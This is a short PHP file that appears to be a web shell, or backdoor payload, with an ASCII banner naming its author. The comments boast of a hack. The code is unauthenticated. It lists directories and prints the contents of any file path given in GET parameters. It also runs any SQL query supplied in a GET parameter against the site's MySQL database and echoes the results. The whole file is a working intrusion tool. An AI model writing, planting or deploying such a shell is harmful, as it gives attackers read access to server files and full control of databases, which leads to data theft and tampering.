<?php 


	$banner ="

 	 _   _                   _____              _____       _____         _   
	| | | | __ ___   _____  |  ___|   _ _ __   |_   _|__   |_   _|__  ___| |_ 
	| |_| |/ _` \ \ / / _ \ | |_ | | | | '_ \    | |/ _ \    | |/ _ \/ __| __|
	|  _  | (_| |\ V /  __/ |  _|| |_| | | | |   | | (_) |   | |  __/\__ \ |_ 
	|_| |_|\__,_| \_/ \___| |_|   \__,_|_| |_|   |_|\___/    |_|\___||___/\__|
																			  
	 _____ _            ____             _                 _   _ 
	|_   _| |__   ___  |  _ \ __ _ _   _| | ___   __ _  __| | | |
	  | | | '_ \ / _ \ | |_) / _` | | | | |/ _ \ / _` |/ _` | | |
	  | | | | | |  __/ |  __/ (_| | |_| | | (_) | (_| | (_| | |_|
	  |_| |_| |_|\___| |_|   \__,_|\__, |_|\___/ \__,_|\__,_| (_)
								   |___/                         
		
	
	 ░█░█░█▀█░█▀▀░█░█░█▀▀░█▀▄ | version: 0.1
	 ░█▀█░█▀█░█░░░█▀▄░█▀▀░█░█ | author: Mohamed Elhefni	
	 ░▀░▀░▀░▀░▀▀▀░▀░▀░▀▀▀░▀▀░ | Github: @/mohamedelhefni
								   
	";


	// hi man how are you ? I hacked my slef :D . i am realy happy to do it . 
	//  have fun to read my payload :|
	//  please don't hack me :(
	
	function echo_pre($arr) 
	{
		echo "<pre>";
		print_r($arr);
		echo "</pre>";
	}





	// connect to database after reading connection.php file from get request  :D 

	$con = mysqli_connect('host', 'user', 'pass', 'dbname') or die('Connection  error');

	if (mysqli_connect_errno()) {
		echo 'Failed to connnect to mysql ' . mysqli_connect_errno();
	}

	mysqli_set_charset($con, "utf8mb4");



	echo_pre($banner);

	if(isset($_GET['dir'])) 
	{
		$dir = $_GET['dir'] ? $_GET['dir'] : './';
		echo_pre(scandir($dir));

		if (isset($_GET['file']))
		{
				$file = $_GET['file'];
				$file_path = $dir.$file;
				if (file_exists($file_path)) 
				{
					$the_file_code = file_get_contents($file_path);
					echo "<pre>" .  htmlentities($the_file_code) . "</pre>";
				}
		}


	}



	if (isset($_GET['query']))
	{
		$query = $_GET['query'];
		$run_data = mysqli_query($con, $query);
		$row = mysqli_fetch_all($run_data);
		echo_pre($row);
	}




	?>